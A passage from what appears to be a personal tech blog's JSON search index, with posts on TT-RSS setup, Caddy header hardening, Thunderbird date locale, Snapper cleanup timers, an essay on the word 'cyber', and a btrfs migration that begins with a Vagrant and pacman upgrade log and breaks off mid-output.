them.\n","permalink":"https://blog.akendo.eu/flash/29.03.2018-linkdrop/","tags":null,"title":"29.03.2018 Linkdrop"},{"categories":null,"contents":" Deciphering China’s AI Dream Total Meltdown? Microsoft did patch the meltdown vulnerability back in January, however they create even bigger flaw\u0026hellip;\n","permalink":"https://blog.akendo.eu/flash/28.03.2018-linkdrop/","tags":null,"title":"28.03.2018 Linkdrop"},{"categories":null,"contents":"Quick note: i had to disable the servertoken of a caddyserver. For this you need to set within a header block the parameter -Server. Something like this:\n# Disable the server token, to prevent information disclosure # Avoids enumeration in servics like shodan.io # https://caddyserver.com/docs/header header / -Server ","permalink":"https://blog.akendo.eu/flash/caddy-disable-servertoken/","tags":null,"title":"Caddy disable servertoken"},{"categories":null,"contents":"RIP Google RSS This Post is long time over do. I once was a heavy user of the Google Reader, a RSS feed reader, developed by Google. However, Google discontinued the Reader in June 2013. Ever since the shutdown, I was forced to use a different services to read my news.\nAt first I used feedly. But whenever I used feedly on my Android phone it turned into pain.The App was loading content very slow, even with wifi enabled. A 2015 note: I don\u0026rsquo;t know how feedly has improved since 2015, but the another issue is that the feedly is not open source. So I was looking for some open source service. There are quite some options. TinyTiny Rss(TT-RSS) seems to be what I was looking for.\nInstallation of TT-RSS The features provide by TT-RSS can be seen as satisfying, however they dependency with PHP give me a unpleasant pain in the back of my brain. For the databases backend Postgresql can be used.\nPackage There are no debian package from the project itself(2018 Note: Nowadays there are package for debian). Only the people doing home-made repository. The installation is quite simple. You can download the archive from they github site. For my local system I use Gentoo. someone was to kind and added the package the portage tree and with a simple:\nemerge -avq www-apps/tt-rss For Ubuntu you can use the PPA from webupd8.org\n2018 update Debian Sid has a package of it\u0026rsquo;s own:\napt-get install tt-rss Should work fine on modern debian based distribution\nDatabase Before you can use TT-RSS you need to run a Database.\nCREATE USER rss LOGIN PASSWORD 'rss'; CREATE DATABASE rss OWNER 'rss'; ALTER ROLE rss ENCRYPTED PASSWORD 'rss'; Next is to alter the /etc/postgresql-9.1/pg_hba.conf to allow access to the right databases.\nhost rss rss 127.0.0.1/32 md5 Now I can access it via 127.0.0.1 with the psql.\npsql -U rss rss psql (9.1.9) Type \u0026quot;help\u0026quot; for help. rss=\u0026gt; Webserver For the my POC I do use an Apache Web service. I do use a simple vhost configuration.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName localhost Include /etc/apache2/vhosts.d/default_vhost.include \u0026lt;Directory /var/www/localhost/htdocs/tt-rss\u0026gt; Options Indexes FollowSymLinks MultiViews AllowOverride None Order allow,deny allow from all \u0026lt;/Directory\u0026gt; \u0026lt;IfModule mpm_peruser_module\u0026gt; ServerEnvironment apache apache \u0026lt;/IfModule\u0026gt; \u0026lt;/VirtualHost\u0026gt; \u0026lt;/IfDefine\u0026gt; and making sure that PHP is in the /etc/config.d/apache enabled.\nConfiguration of TT-RSS ![Configuration from web](./pictures/Tiny Tiny RSS - Installer - Mozilla Firefox_001.png)\nFrom here the installation is simple, login to the 127.0.0.1/tt-rss/ and follow the installation instructions or you change it within the config.php like this:\ndefine('DB_TYPE', \u0026quot;pgsql\u0026quot;); // pgsql or mysql define('DB_HOST', \u0026quot;localhost\u0026quot;); define('DB_USER', \u0026quot;rss\u0026quot;); define('DB_NAME', \u0026quot;rss\u0026quot;); define('DB_PASS', \u0026quot;rss\u0026quot;); define('DB_PORT', '5432'); Testing Just subscribe to some feeds and you\u0026rsquo;re done! One great plugin is FeedMode (2018 note: this project is abandoned.) The plugin fetches the content of an article instead the header. This way, it\u0026rsquo;s possible to read the context out of Tiny-Tiny-RSS itself. That becomes particular useful on a smartphone.\nAndroid Application One last thing, you can use TT-RSS with an App for a Android Phone. You can get it from the play store or from F-Droid. For the usage of the App you need to enable the API on Tiny-Tiny-RSS.\nSummary TinyTiny-RSS is a good alternative for the Google Reader. With the plugins it become almost a replacement for the Google Reader. There is also a great Android App that can be used to connect and read feeds from an Android Phone.\n2018: I had this article done since 2015\u0026hellip; however never finished it\u0026hellip; the original post was on 5th of January in 2014! But I\u0026rsquo;m getting going!\n","permalink":"https://blog.akendo.eu/post/2014-01-05-tinytiny-rss/","tags":null,"title":"TinyTiny RSS"},{"categories":null,"contents":"Some nerdy thing to share:\nhttps://nautil.us/blog/-i-built-a-stable-planetary-system-with-416-planets-in-the-habitable-zone the Ultimate Solar Systems ;-) http://review.chicagobooth.edu/behavioral-science/2018/article/how-poverty-changes-your-mind-set this took me by surprise. Short: When you\u0026rsquo;re on stress and on low money or resources you might become cognitive diminished for other options. But also way more resourceful to work with the little you have. Very nice. ","permalink":"https://blog.akendo.eu/flash/02.03.2018-linkdrop/","tags":null,"title":"02.03.2018 Linkdrop"},{"categories":null,"contents":"Thunderbird has a American style for tracking dates and clocks. I dislike this format, because I tend to mix the times up. For example 12 AM is midnight and not noon. But when you\u0026rsquo;re not used to the 12-hour clock standard, AM and PM are not that simple to put your your mid on, it\u0026rsquo;s inconvenient.\nFun fact. In the world of IT you have thing like endianness. Endianness is a way to sort information. In most case a memory address for example: 0x12AB34,as an example for big endianness, where the MSB is the last byte to read. Little endian is when the memory address starts with the LSB in this case: 0x34AB12.\nWe read in our mind by default with big endian: For example: \u0026ldquo;1234\u0026rdquo;. The most significant number begins and all number with less power are written downwards. The same number in little endian would be: \u0026ldquo;4321\u0026rdquo;, very confusing.\nHere comes the punch line: You can sort date formats also with endianness. Most countries in the world have a little endianess format. The annoying part is that you the default date format is American for many applications, that is in fact a middle endian format. Middle? Yes.\nlittle endian date: day.month.year big endian date: year.month.year middle endian date: month.day.year The reason for the middle endian in date formats derive from the speaking language behind it. Back to fixing this. Within Thunderbird you can change this behavior by configuring some options OR you set a variable:\nLC_TIME=de_DE.utf8 export LC_TIME Start Thunderbird will now display dates in a better format ;-). Another note for this: When running fish:\nset -x LC_TIME de_DE.utf8 This would be the same as above, just in a persistent matter.\nbest regards akendo\n","permalink":"https://blog.akendo.eu/post/2018-03-01-thunderbird-timestamp/","tags":null,"title":"Thunderbird Timestamp"},{"categories":null,"contents":"Another funny link I got:\nhttp://blog.robertelder.org/switch-statements-statement-expressions/ About validate syntax of a case statement that can be abused to make code unreadable https://github.com/maxchehab/CSS-Keylogging \u0026ldquo;Chrome extension and Express server that exploits keylogging abilities of CSS.\u0026rdquo; ","permalink":"https://blog.akendo.eu/flash/21.02.2018-linkdrop/","tags":null,"title":"21.02.2018 Linkdrop"},{"categories":null,"contents":"Another list of link I read today ;-):\nhttps://gravityandlevity.wordpress.com/2009/07/08/your-body-wasnt-built-to-last-a-lesson-from-human-mortality-rates/ How the age is affecting our mortality. Fun to read, because math and statistics. https://www.theguardian.com/news/2018/feb/15/why-silicon-valley-billionaires-are-prepping-for-the-apocalypse-in-new-zealand why many Silicon Valley billionaires are heading for New Zealand. Funny that they see a solution in case for the end of the world\u0026hellip; https://en.wikipedia.org/wiki/Exploratory_testing Just on a side note ","permalink":"https://blog.akendo.eu/flash/15.02.2018-links/","tags":null,"title":"link drop"},{"categories":null,"contents":"Here a list of link I read today:\nhttps://jods.mitpress.mit.edu/pub/issue3-brand The idea is to have a layered concecpt of time. Where changes are made over time are sorted to this layers. https://www.scientificamerican.com/article/cognitive-ability-and-vulnerability-to-fake-news/ Some science about \u0026lsquo;fake news\u0026rsquo; how people are reacting to false information. Note: It exploited the concept of \u0026lsquo;The Illusion of Truth\u0026rsquo; that was shown by Veritasium in 2016. It\u0026rsquo;s no surprise, interesting is the fact that older people might be more prone to this. https://www.scientificamerican.com/article/bad-news-for-the-highly-intelligent/ Last one, the tendency of intelligent people to be depressive or have some type of physiological disorders. ","permalink":"https://blog.akendo.eu/flash/14.02.2018-links/","tags":null,"title":"link drop"},{"categories":null,"contents":"Happy new year everyone!\nbest regards akendo\n","permalink":"https://blog.akendo.eu/post/2018-01-01-happy/","tags":null,"title":"Happy new year 2018"},{"categories":null,"contents":"A late Merry \u0026ldquo;Insert your seasonal remainder in here___\u0026rdquo;. A happy new year!\nbest regards akendo\n","permalink":"https://blog.akendo.eu/post/2017-12-17-merryxmas/","tags":null,"title":"Merry Xmas"},{"categories":null,"contents":"I changed some aspects of the blog design. Most notably is the change of the font. The default theme font is Source Code Pro. However, this font was created for reading source codes. I think that this font is not suitable for the main text of a blog. Especially, when I have an inline code block. Something I dislike.\nAnother change is the format of the dates. From a month-day-year to day.month.year. This format is more accustomed to me. Also, I changed the main page. Previously, the main page shows a list of the latest posts, including a summary for each listed post. Now, instead of the summary, the content of each post is displayed. All posts are licensed with a creative commons CC-BY now.\nLater, I am goingt to rewrite posts and fix the hyperlinks. Many of my first posts are horribly written. A proper grammar check is necessary. I might change some aspects of the style sheet, too: Things like the background color and text alignment.\nso far, Akendo\n","permalink":"https://blog.akendo.eu/post/2017-17-10-blog-update/","tags":null,"title":"Design update"},{"categories":null,"contents":"A while ago I did a btrfs migration that includes the usage of snapper. However, once in a while my disk is running full. Simply for every install sets of packages in pacman, snapper creates a snapshot. So I need to clean up the snapshots of Snapper to get free disk space. Lucky enough, Snapper provide a unit file: /usr/lib/systemd/system/snapper-cleanup.timer\n[Unit] Description=Daily Cleanup of Snapper Snapshots Documentation=man:snapper(8) man:snapper-configs(5) [Timer] OnBootSec=10m OnUnitActiveSec=1d [Install] WantedBy=timers.target Running this will make Snapper clean up old snapshots and free disk space! For persistence you can enable this unit file:\nsudo systemctl enable snapper-cleanup.timer However doing this everyday seems to me a little bit much. So I changed to it once a week instead.\nSo my unit file looks like this:\n[Unit] Description=Daily Cleanup of Snapper Snapshots Documentation=man:snapper(8) man:snapper-configs(5) [Timer] OnBootSec=10m OnUnitActiveSec=1w [Install] WantedBy=timers.target After doing this you need to run sudo systemctl daemon-reload to enable the changes.\nbest regards Akendo\n","permalink":"https://blog.akendo.eu/post/2017-19-09-snappercleanup/","tags":null,"title":"Snapper clean up"},{"categories":null,"contents":"Let\u0026rsquo;s cyber! There is some cyber in my blog! cyber\u0026hellip; what? Don\u0026rsquo;t get the word wrong like cypher or cyder. Because I do \u0026ldquo;cybersecurity\u0026rdquo; and I work against cybercrime. What\u0026rsquo;s the different to a normal crime? It\u0026rsquo;s done in the cyberspace! So what\u0026rsquo;s cyberspace? Might be called the cyberinternet. Wait\u0026hellip;the Internet is already cyber\u0026hellip;so cybernet than or the dark web?\nTo much cyber\u0026hellip; There is cyberpunk, cyberspace (like the one from Ghost in the Shell) cyberwar, cyberterrorism and so on. Why does this word \u0026lsquo;cyber\u0026rsquo; has become so popular lately? Maybe because of suddenly usage by every politician and lesser form of professional person in the internet? For many persons that are active in that field of computer security, this word is comply free of meaning.\nWhat\u0026rsquo;s cyber? The word has it\u0026rsquo;s roots in a research paper from 1950, where the idea of cybernetics or kybernetik was introduced. It\u0026rsquo;s the first use of the word, and it described a controller or regulator for an engine. It might be also used way back in the ancient. But they pictured with this word more a being or thing that is a navigator. In the academic paper it had it first modern usage, still related to control. Nowadays it meaning is in a relation to the Internet. A word that relates to a virtual space. Applied thing (like crime) with a thing from the no-technical world. Cyber as word has lost it meaning, if it had any. It became like an apple presentation, just a chain of words that are put up front of something that does not add any type of information. Most of the time you can just leave it away.\nWhen you repeat a word or re-used it that often. It becomes, as the linguistics would say, a Passepartout.\nWhat I like \u0026hellip; about the word is its connotation. It\u0026rsquo;s something new, mystical, some with with respect. At least for a common person. For most hackers I met, it\u0026rsquo;s a abortion and express disrespect against the technology. We can\u0026rsquo;t associate a thing with something. When someone says \u0026lsquo;it happen in the cyberspace\u0026hellip;\u0026rsquo;, so it was an IP-Address or was it on a webserver, might be on your phone\u0026hellip;it\u0026rsquo;s just vague. Another example that comes to mind is \u0026lsquo;cyberterrorism\u0026rsquo;, where here is not clean what the different is to any other type of wrongdoing on the Internet. In general is terrorism a word I can\u0026rsquo;t work with. Terror is a state, the highest degree of fear a person can fell. When a person is a terrorist he does depict \u0026lsquo;fear\u0026rsquo;. But that a moment. What\u0026rsquo;s when he\u0026rsquo;s in jail? Does he still emit \u0026rsquo;terror\u0026rsquo;? Should he be not a convict by than? Anyway that\u0026rsquo;s not the point I\u0026rsquo;m going to make.\nHowever, language is a living and therefore a changing thing. Words like \u0026lsquo;cyber\u0026rsquo; give people the power to talk about things they are affect off (or believe to ). Since the heavy usage of the internet, many more people going to be affect of it. So they want to relate to \u0026lsquo;it\u0026rsquo; and finding new words to describe \u0026lsquo;it\u0026rsquo;. That do work because the word are NOT defined and not know to us. When I ask you to explain \u0026ldquo;cyber\u0026rdquo;, to me, what would you say?\nWikipedia has very \u0026lsquo;good\u0026rsquo; description of what it supposed to be:\nCyberwarfare has been defined as \u0026ldquo;actions by a nation-state to penetrate another nation\u0026rsquo;s computers or networks for the purposes of causing damage or disruption,\u0026quot;[1]:6 but other definitions also include non-state actors, such as terrorist groups, companies, political or ideological extremist groups, hacktivists, and transnational criminal organizations.\nA look into the reference list of Wikipedia and the fist entry is a book about Cyber War from Richard A. Clarke, a former presidential advisor and \u0026lsquo;counter-terrorism\u0026rsquo; expert. (Who declared him as a expert?)\nYet we can see that most of this topics are from around 2010, fewer before 2009. Most of this information that is done before does not exists. We can see that this change the way to see the word. Why not any cyber word? Because it\u0026rsquo;s the witch military have understood the value of attack other as strategy. This would need more resource to work with.\nin the end\u0026hellip; \u0026hellip; it\u0026rsquo;s a word use to describe nothing. It allow however to justify with means other things. Because all we know is, that there is a \u0026rsquo;threat from the cyberspace\u0026rsquo;. That wants to steal our bank account and infect our computer! But it\u0026rsquo;s not that simple. That\u0026rsquo;s why I don\u0026rsquo;t like the word. But language lives and there I have to live with the word.\n[0]https://www.youtube.com/watch?v=cebFWOlx848\n€dit: It took me 1 year to get this done\u0026hellip; and this two years i had this one in there query. €dit2: Add a picture, thanks to @Cyberrolle(on Twitter) for let me use this image.\n","permalink":"https://blog.akendo.eu/post/2017-11-09-cyber/","tags":null,"title":"cyber"},{"categories":null,"contents":"Migration to btrfs As some of you might know, it take me often quite some time to get things done. One of this ongoing issue is the migration of my filesystem. For more than two years i wanted to migrate the root filesystem of my laptop from ext4 to btrfs. In fact i did this migration two years ago, but only partly. Ever since i\u0026rsquo;m stuck with a half finished migration of btrfs.\nWhat\u0026rsquo;s btrfs? So for anyone who havn\u0026rsquo;t heard of btrfs. btrfs is a new type of filesystem, with similar features like zfs. Where new is new like a second-hand car. It works fine, but isn\u0026rsquo;t the newest and most shining model on the market. But it does quite good what is supposed to be there.\nThe feature include copy-on-write(cow), snapshot, subvolumes, data deduplication. Things a more \u0026lsquo;classic\u0026rsquo; filesystem can\u0026rsquo;t do. snapshot with ext4? Only when you run lvm. What\u0026rsquo;s most interesting are the subvolumes. Compare them to a partition within the filesystem. It allows to slice the filesystem into more smaller chunk to store data. Like lvm, just within the filesystem itself. This allows to use snapshot more effective.\nMigration The migrate is quite simple:\nbtrfs-convert /dev/sdX This will move all data from a extX to btrfs. In addition, the original filesystem will be preserved within a subvolume. At this stage you could validate the data of the original filesystem with the one migrated. When done, just remove the subvolume.\nWhat\u0026rsquo;s next? Here comes the trick part. All of the data are migrate to the top level structure of the filesystem. This allows usage of this file. However this isn\u0026rsquo;t the intended usage. In my case, the root filesystem is located here. I boot and work from this part. The right thing would be to move the data into a subvolume.\nSo btrfs is in place, but the problem is that i don\u0026rsquo;t use it in a desirable way. I moved all data from ext4 to btrfs and that\u0026rsquo;s it! But the idea was first to use the subvolume function and the snapshot function with snapper. Yet all of my data are in the top level container of btrfs. Creating the problem that I can\u0026rsquo;t really use the snapper function and not utilizing the snapshot at all. Even worse, this way I just use it in a traditional way.\nNext step is to move the data away from the top level structure into separated subvolumes and than setup snapper.\nTesting Because my laptop is a productive system i didn\u0026rsquo;t want to mess up. I decided to get a testing environment that mimics my laptop. For this i installed a virtual machine with archlinux. The root filesystem will then migrate to btrfs. Next would be to than move all data to a subvolume and test that this migration will work. Including the boot process.\nSetup a archlinux VM with vagrant mkdir Vagrant-archlinux cd Vagrant-archlinux vagrant init Note: You can download the Vagrantfile from here\nNext step was to add a archlinux based box. I added one box from the http://www.vagrantbox.es/ . All of the boxes listed there are out-dated. I could have create a new one, but updating is faster. So I went with the newest box of them and updated it. This way it represented my laptop state. After the upgrade the migration to btrfs will be done to close the gap to my laptop.\nvagrant box add archlinux http://vagrant.srijn.net/archlinux-x64-2014-01-07.box I changed the default box in the to archlinux\nconfig.vm.box = \u0026#34;archlinux\u0026#34; Next is to start the VM:\nvagrant up Bringing machine \u0026#39;default\u0026#39; up with \u0026#39;virtualbox\u0026#39; provider... ==\u0026gt; default: Importing base box \u0026#39;archlinux\u0026#39;... ==\u0026gt; default: Matching MAC address for NAT networking... ==\u0026gt; default: Setting the name of the VM: Vagrant-archlinux_default_1499030023852_79753 ==\u0026gt; default: Clearing any previously set network interfaces... ==\u0026gt; default: Preparing network interfaces based on configuration... default: Adapter 1: nat ==\u0026gt; default: Forwarding ports... default: 22 (guest) =\u0026gt; 2222 (host) (adapter 1) ==\u0026gt; default: Booting VM... ==\u0026gt; default: Waiting for machine to boot. This may take a few minutes... default: SSH address: 127.0.0.1:2222 default: SSH username: vagrant default: SSH auth method: private key default: default: Vagrant insecure key detected. Vagrant will automatically replace default: this with a newly generated keypair for better security. default: default: Inserting generated public key within guest... default: Removing insecure key from the guest if it\u0026#39;s present... default: Key inserted! Disconnecting and reconnecting using new SSH key... ==\u0026gt; default: Machine booted and ready! ==\u0026gt; default: Checking for guest additions in VM... default: The guest additions on this VM do not match the installed version of default: VirtualBox! In most cases this is fine, but in rare cases it can default: prevent things such as shared folders from working properly. If you see default: shared folder errors, please make sure the guest additions within the default: virtual machine match the version of VirtualBox you have installed on default: your host and reload your VM. default: default: Guest Additions Version: 4.3.6 default: VirtualBox Version: 5.1 ==\u0026gt; default: Mounting shared folders... default: /vagrant =\u0026gt; /home/akendo/Vagrant-archlinux Login into the VM\nvgrant ssh Last login: Mon Jan 6 21:50:22 2014 from 10.0.2.2 [vagrant@vagrant ~]$ Upgrading the old archlinux box The upgrade was a bit trick and i had to do it twice. First was to get the newest packages\n[vagrant@vagrant ~]$ sudo su - [root@vagrant ~]# pacman -Syu :: Synchronizing package databases... core 124.7 KiB 291K/s 00:00 [########################################################################################] 100% extra 1664.6 KiB 2.09M/s 00:01 [########################################################################################] 100% community 3.9 MiB 3.10M/s 00:01 [########################################################################################] 100% :: Starting full system upgrade... :: Replace dirmngr with core/gnupg? [Y/n] :: Replace dnsutils with extra/bind-tools? [Y/n] :: Replace libdbus with core/dbus? [Y/n] :: Replace libltdl with core/libtool? [Y/n] :: Replace libusbx with core/libusb? [Y/n] :: Replace virtualbox-guest-modules with community/virtualbox-guest-modules-arch? [Y/n] resolving dependencies... :: There are 3 providers available for libgl: :: Repository extra 1) libglvnd 2) nvidia-304xx-utils 3) nvidia-340xx-utils Enter a number (default=1): 1 warning: dependency cycle detected: warning: systemd will be installed before its cryptsetup dependency warning: dependency cycle detected: warning: harfbuzz will be installed before its freetype2 dependency warning: dependency cycle detected: warning: mesa will be installed before its libglvnd dependency looking for inter-conflicts... Packages (247): acl-2.2.52-3 archlinux-keyring-20170611-1 attr-2.4.47-2 autoconf-2.69-4 automake-1.15-2 bash-4.4.012-2 bind-tools-9.11.1.P1-1 binutils-2.28.0-3 bison-3.0.4-2 bzip2-1.0.6-6 ca-certificates-20170307-1 ca-certificates-cacert-20140824-4 ca-certificates-mozilla-3.31-3 ca-certificates-utils-20170307-1 compositeproto-0.4.2-3 coreutils-8.27-1 cracklib-2.9.6-1 cronie-1.5.1-1 cryptsetup-1.7.5-1 curl-7.54.1-1 damageproto-1.2.1-3 db-5.3.28-3 dbus-1.10.18-1 desktop-file-utils-0.23-1 device-mapper-2.02.172-1 dhcpcd-6.11.5-1 diffutils-3.6-1 dirmngr-1.1.1-1 [removal] dnssec-anchors-20170228-1 dnsutils-9.9.2.P2-1 [removal] e2fsprogs-1.43.4-1 elinks-0.13-18 expat-2.2.1-1 fakeroot-1.21-2 file-5.31-1 filesystem-2017.03-2 findutils-4.6.0-2 fixesproto-5.0+9+g4292ec1-1 flex-2.6.4-1 fontconfig-2.12.3-1 fontsproto-2.1.3-2 freetype2-2.8-2 gawk-4.1.4-2 gc-7.6.0-1 gcc-7.1.1-3 gcc-libs-7.1.1-3 gdbm-1.13-1 geoip-1.6.10-1 geoip-database-20170606-1 gettext-0.19.8.1-2 glib2-2.52.2+9+g3245eba16-1 glibc-2.25-5 gmp-6.1.2-1 gnupg-2.1.21-3 gnutls-3.5.13-1 gpgme-1.9.0-3 gpm-1.20.7-7 graphite-1:1.3.10-1 grep-3.0-1 groff-1.22.3-7 grub-2:2.02-1 guile-2.2.2-1 gzip-1.8-2 harfbuzz-1.4.6-1 htop-2.0.2-1 hwids-20170328-1 iana-etc-20170512-1 icu-59.1-1 inetutils-1.9.4-5 iproute2-4.11.0-1 iptables-1.6.1-1 iputils-20161105.1f2bb12-2 js185-1.0.0-3 json-c-0.12.1-1 kbd-2.0.4-1 kbproto-1.0.7-1 keyutils-1.5.10-1 kmod-24-1 krb5-1.15.1-1 ldns-1.7.0-3 less-487-1 libaio-0.3.110-1 libarchive-3.3.1-5 libassuan-2.4.3-1 libatomic_ops-7.4.6-1 libcap-2.25-1 libdbus-1.6.18-3 [removal] libdrm-2.4.81-1 libedit-20170329_3.1-1 libelf-0.169-1 libepoxy-1.4.3-1 libevdev-1.5.7-1 libevent-2.1.8-1 libffi-3.2.1-2 libfontenc-1.1.3-1 libgcrypt-1.7.8-1 libglvnd-0.2.999+g4ba53457-2 libgpg-error-1.27-1 libgudev-231+1+g0841288-1 libice-1.0.9-1 libidn-1.33-1 libinput-1.7.3-1 libksba-1.3.4-2 libldap-2.4.44-5 libltdl-2.4.2-12 [removal] libmnl-1.0.4-1 libmpc-1.0.3-2 libnftnl-1.0.7-1 libnghttp2-1.23.1-1 libnl-3.3.0-1 libomxil-bellagio-0.9.3-1 libpcap-1.8.1-2 libpciaccess-0.13.5-1 libpipeline-1.4.1-1 libpng-1.6.29-1 libpsl-0.17.0-2 libsasl-2.1.26-11 libseccomp-2.3.2-1 libsecret-0.18.5+14+g9980655-1 libssh2-1.8.0-2 libsystemd-233-6 libtasn1-4.12-1 libtirpc-1.0.1-3 libtool-2.4.6-8 libtxc_dxtn-1.0.1-6 libunistring-0.9.7-1 libunwind-1.2.1-1 libusb-1.0.21-2 libusbx-1.0.17-1 [removal] libutempter-1.1.6-2 libutil-linux-2.29.2-2 libwacom-0.24-1 libx11-1.6.5-1 libxcb-1.12-1 libxcomposite-0.4.4-2 libxdamage-1.1.4-2 libxdmcp-1.1.2-1 libxext-1.3.3-1 libxfixes-5.0.3-1 libxfont-1.5.2-1 libxfont2-2.0.1-1 libxkbfile-1.0.9-1 libxml2-2.9.4+16+g07418011-2 libxrandr-1.5.1-1 libxrender-0.9.10-1 libxshmfence-1.2-1 libxt-1.1.5-1 libxxf86vm-1.1.4-1 licenses-20140629-2 linux-4.11.7-1 linux-api-headers-4.10.1-1 linux-firmware-20170422.ade8332-1 llvm-libs-4.0.1-1 lm_sensors-3.4.0-2 logrotate-3.12.2-1 lua51-5.1.5-6 lvm2-2.02.172-1 lz4-1:1.7.5-1 m4-1.4.18-1 make-4.2.1-2 man-db-2.7.6.1-2 man-pages-4.11-1 mdadm-4.0-1 mesa-17.1.4-1 mkinitcpio-23-1 mkinitcpio-busybox-1.26.1-1 mlocate-0.26-6 mpfr-3.1.5.p2-1 mtdev-1.1.5-1 nano-2.8.5-1 ncurses-6.0+20170527-1 net-tools-1.60.20160710git-1 netctl-1.12-2 nettle-3.3-1 npth-1.5-1 nspr-4.15-1 openresolv-3.9.0-1 openssh-7.5p1-2 openssl-1.1.0.f-1 p11-kit-0.23.7-1 pacman-5.0.2-1 pacman-mirrorlist-20170628-1 pam-1.3.0-1 patch-2.7.5-1 pciutils-3.5.4-1 pcre-8.40-1 perl-5.26.0-1 pinentry-1.0.0-1 pixman-0.34.0-1 pkg-config-0.29.2-1 popt-1.16-8 procps-ng-3.3.12-1 psmisc-22.21-3 pth-2.0.7-5 randrproto-1.5.0-1 readline-7.0.003-1 reiserfsprogs-3.6.25-1 renderproto-0.11.1-3 rsync-3.1.2-2 run-parts-4.8.1-1 s-nail-14.8.16-2 sed-4.4-1 shadow-4.4-3 sqlite-3.19.3-1 sudo-1.8.20.p2-1 sysfsutils-2.1.0-9 systemd-233-6 systemd-sysvcompat-233-6 tar-1.29-2 texinfo-6.4-1 thin-provisioning-tools-0.7.0-1 tmux-2.5-3 tre-0.8.0-4 tzdata-2017b-1 usbutils-008-1 util-linux-2.29.2-2 vi-1:070224-2 vim-8.0.0628-1 vim-runtime-8.0.0628-1 virtualbox-guest-modules-4.3.6-2 [removal] virtualbox-guest-modules-arch-5.1.22-4 virtualbox-guest-utils-5.1.22-2 wayland-1.13.0-1 wget-1.19.1-2 which-2.21-2 xcb-proto-1.12-3 xextproto-7.3.0-1 xf86-input-evdev-2.10.5-1 xf86-input-libinput-0.25.1-1 xf86vidmodeproto-2.3.1-3 xfsprogs-4.11.0-1 xkeyboard-config-2.21-2 xorg-bdftopcf-1.0.5-1 xorg-font-util-1.3.1-1 xorg-font-utils-7.6-4 xorg-fonts-encodings-1.0.4-4 xorg-fonts-misc-1.0.3-5 xorg-mkfontdir-1.0.7-8 xorg-mkfontscale-1.1.2-1 xorg-server-1.19.3-2 xorg-server-common-1.19.3-2 xorg-setxkbmap-1.3.1-1 xorg-xkbcomp-1.4.0-1 xorg-xrandr-1.5.0-1 xproto-7.0.31-1 xz-5.2.3-1 zlib-1:1.2.11-1 Total Download Size: 325.87 MiB Total Installed Size: 1238.04 MiB Net Upgrade Size: 586.92 MiB :: Proceed with installation? [Y/n] At this point i got a ton of message. I went on and accepted all of them. He will then download of the packages of the last 3 years. But the upgrade will fail because of the keyring. It\u0026rsquo;s necessary to upgrade the archlinux-keyring manual.\n[root@vagrant ~]# pacman -U /var/cache/pacman/pkg/archlinux-keyring-20170611-1-any.pkg.tar.xz loading packages... resolving dependencies... looking for inter-conflicts... Packages (1): archlinux-keyring-20170611-1 Total Installed Size: 0.89 MiB Net Upgrade Size: 0.34 MiB :: Proceed with installation? [Y/n] y (1/1) checking keys in keyring [########################################################################################] 100% (1/1) checking package integrity [########################################################################################] 100% (1/1) loading package files [########################################################################################] 100% (1/1) checking for file conflicts [########################################################################################] 100% (1/1) checking available disk space [########################################################################################] 100% (1/1) upgrading archlinux-keyring [########################################################################################] 100% ==\u0026gt; Appending keys from archlinux.gpg... gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model gpg: depth: 0 valid: 1 signed: 4 trust: 0-, 0q, 0n, 0m, 0f, 1u gpg: depth: 1 valid: 4 signed: 72 trust: 0-, 0q, 0n, 4m, 0f, 0u gpg: depth: 2 valid: 70 signed: 10 trust: 70-, 0q, 0n, 0m, 0f, 0u gpg: next trustdb check due at 2017-10-20 ==\u0026gt; Locally signing trusted keys in keyring... -\u0026gt; Locally signing key DDB867B92AA789C165EEFA799B729B06A680C281... -\u0026gt; Locally signing key 0E8B644079F599DFC1DDC3973348882F6AC6A4C2... -\u0026gt; Locally signing key 684148BB25B49E986A4944C55184252D824B18E8... -\u0026gt; Locally signing key 91FFE0700E80619CEB73235CA88E23E377514E00... -\u0026gt; Locally signing key 44D4A033AC140143927397D47EFD567D4C7EA887... -\u0026gt; Locally signing key AB19265E5D7D20687D303246BA1DFB64FFF979E7... ==\u0026gt; Importing owner trust values... gpg: setting ownertrust to 4 gpg: setting ownertrust to 4 ==\u0026gt; Disabling revoked keys in keyring... -\u0026gt; Disabling key F5A361A3A13554B85E57DDDAAF7EF7873CFD4BB6... -\u0026gt; Disabling key 7FA647CD89891DEDC060287BB9113D1ED21E1A55... -\u0026gt; Disabling key D4DE5ABDE2A7287644EAC7E36D1A9E70E19DAA50... -\u0026gt; Disabling key 40440DC037C05620984379A6761FAD69BA06C6A9... -\u0026gt; Disabling key BC1FBE4D2826A0B51E47ED62E2539214C6C11350... -\u0026gt; Disabling key 9515D8A8EAB88E49BB65EDBCE6B456CAF15447D5... -\u0026gt; Disabling key 4A8B17E20B88ACA61860009B5CED81B7C2E5C0D2... -\u0026gt; Disabling key 63F395DE2D6398BBE458F281F2DBB4931985A992... -\u0026gt; Disabling key 0B20CA1931F5DA3A70D0F8D2EA6836E1AB441196... -\u0026gt; Disabling key 8F76BEEA0289F9E1D3E229C05F946DED983D4366... -\u0026gt; Disabling key 66BD74A036D522F51DD70A3C7F2A16726521E06D... -\u0026gt; Disabling key 81D7F8241DB38BC759C80FCE3A726C6170E80477... -\u0026gt; Disabling key 5E7585ADFF106BFFBBA319DC654B877A0864983E... -\u0026gt; Disabling key E7210A59715F6940CF9A4E36A001876699AD6E84... -\u0026gt; Disabling key 27FFC4769E19F096D41D9265A04F9397CDFD6BB0... ==\u0026gt; Updating trust database... gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model gpg: depth: 0 valid: 1 signed: 6 trust: 0-, 0q, 0n, 0m, 0f, 1u gpg: depth: 1 valid: 6 signed: 72 trust: 0-, 0q, 0n, 6m, 0f, 0u gpg: depth: 2 valid: 71 signed: 10 trust: 71-, 0q, 0n, 0m, 0f, 0u gpg: next trustdb check due at 2017-10-20 Also the ca-certificates.crt needs to be removed as you can read here\n[root@vagrant ~]# rm /etc/ssl/certs/ca-certificates.crt At this point the re-run of pacman -Syu will be successful. Almost, because the mkinitcpio script needs to be rerun before. Else the system won\u0026rsquo;t boot.\n[root@vagrant ~]# mkinitcpio -p linux ==\u0026gt; Building image from preset: /etc/mkinitcpio.d/linux.preset: \u0026#39;default\u0026#39; -\u0026gt; -k /boot/vmlinuz-linux -c /etc/mkinitcpio.conf -g /boot/initramfs-linux.img ==\u0026gt; Starting build: 4.11.7-1-ARCH 